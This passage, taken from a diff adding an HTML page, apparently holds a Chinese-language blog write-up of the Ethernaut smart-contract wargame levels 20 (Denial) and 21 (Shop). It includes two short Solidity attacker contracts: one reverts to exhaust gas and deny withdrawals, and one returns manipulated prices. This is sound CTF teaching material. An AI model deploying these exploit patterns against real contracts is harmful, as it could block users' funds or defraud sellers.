&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>本题有个很明显的重入漏洞，看似我们可以通过重入 withdraw 方法将合约中的资金全部转走，如此一来，owner 自然无法成功转账。但是！每次转账金额都是余额的 1%，转是转不完的，重入是不行的。所以我们需要另想办法（按照题意也是要求在合约中还有资金的时候 DOS）。</p>
+<p>主要思路是，让合约在执行时消耗完所有 gas，交易失败。所以我们可以构建这样的攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract DenialAttacker &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        assert(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将该合约设置为 WithdrawPartner 后提交即可通过。</p>
+<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h2><h3 id="通关条件-10"><a href="#通关条件-10" class="headerlink" title="通关条件"></a>通关条件</h3><p>实现一个函数，使得两次调用返回值不同</p>
+<h3 id="目标合约-9"><a href="#目标合约-9" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Shop</span> </span>&#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>和第 11 题很像，但是此题的 price 函数被设置为 view，所以我们无法利用攻击合约中的字段来处理返回值。注意到 Shop 中有个 isSold 字段，我们可以利用它来调整返回值，攻击合约如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract ShopAttacker is Buyer &#123;</span><br><span class="line">    Shop public shop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(Shop _shop) public &#123;</span><br><span class="line">        shop = _shop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> shop.isSold() ? <span class="number">1</span> : <span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是在尝试提交后发现交易失败。经过查询得知，随着 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1884.md" target="_blank" rel="noopener">EIP-1884</a> 的实施，SLOAD 的 gas 消耗增加了，导致此题目前无解，详见<a href="https://github.com/OpenZeppelin/ethernaut/issues/156" target="_blank" rel="noopener">这里</a>。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+          
+            <a href="/tags/Ethereum/" rel="tag"># Ethereum</a>
+          
+            <a href="/tags/Blockchain/" rel="tag"># Blockchain</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/15/ethernaut-workthrough-0-10/" rel="next" title="Ethernaut 题解（0-10）">
+                <i class="fa fa-chevron-left"></i> Ethernaut 题解（0-10）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/01/capturetheether-lotteries/" rel="prev" title="Capturetheether 题解（Lotteries）">
+                Capturetheether 题解（Lotteries） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Lanford33</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/%7C%7C%20archive">
+                
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Elevator"><span class="nav-number">1.</span> <span class="nav-text">11. Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件"><span class="nav-number">1.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约"><span class="nav-number">1.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程"><span class="nav-number">1.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Privacy"><span class="nav-number">2.</span> <span class="nav-text">12. Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-1"><span class="nav-number">2.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-1"><span class="nav-number">2.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-1"><span class="nav-number">2.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Gatekeeper-One"><span class="nav-number">3.</span> <span class="nav-text">13. Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-2"><span class="nav-number">3.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-2"><span class="nav-number">3.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-2"><span class="nav-number">3.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-Gatekeeper-Two"><span class="nav-number">4.</span> <span class="nav-text">14. Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-3"><span class="nav-number">4.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-3"><span class="nav-number">4.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-3"><span class="nav-number">4.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-Naught-Coin"><span class="nav-number">5.</span> <span class="nav-text">15. Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-4"><span class="nav-number">5.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-4"><span class="nav-number">5.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-4"><span class="nav-number">5.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-Preservation"><span class="nav-number">6.</span> <span class="nav-text">16. Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-5"><span class="nav-number">6.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-5"><span class="nav-number">6.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-5"><span class="nav-number">6.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-Recovery"><span class="nav-number">7.</span> <span class="nav-text">17. Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-6"><span class="nav-number">7.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-6"><span class="nav-number">7.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-6"><span class="nav-number">7.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-MagicNumber"><span class="nav-number">8.</span> <span class="nav-text">18. MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-7"><span class="nav-number">8.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用者合约"><span class="nav-number">8.2.</span> <span class="nav-text">调用者合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-7"><span class="nav-number">8.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-Alien-Codex"><span class="nav-number">9.</span> <span class="nav-text">19. Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-8"><span class="nav-number">9.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-7"><span class="nav-number">9.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-8"><span class="nav-number">9.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-Denial"><span class="nav-number">10.</span> <span class="nav-text">20. Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-9"><span class="nav-number">10.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-8"><span class="nav-number">10.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路"><span class="nav-number">10.3.</span> <span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-Shop"><span class="nav-number">11.</span> <span class="nav-text">21. Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-10"><span class="nav-number">11.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-9"><span class="nav-number">11.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-1"><span class="nav-number">11.3.</span> <span class="nav-text">解题思路</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lanford33</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Mist</a> v6.0.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.4"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
